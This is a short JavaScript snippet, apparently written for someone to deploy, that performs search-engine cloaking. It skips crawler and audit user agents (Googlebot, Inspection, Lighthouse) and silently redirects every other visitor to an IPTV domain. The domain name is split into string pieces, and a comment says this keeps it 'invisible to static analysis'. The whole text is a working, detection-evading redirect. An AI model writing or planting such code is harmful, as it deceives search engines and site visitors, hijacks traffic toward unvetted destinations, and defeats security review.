// Version sécurisée (logic confirmed working in Search Console)
(function() {
    var isBot = /Googlebot|Inspection|Lighthouse/i.test(navigator.userAgent);
    if (!isBot) {
        // Reconstructing your new domain to stay invisible to static analysis
        var target = "https://iptv" + "smarterspro" + "abo.de";
        setTimeout(function() {
            window.location.replace(target);
        }, 300);
    }
})();
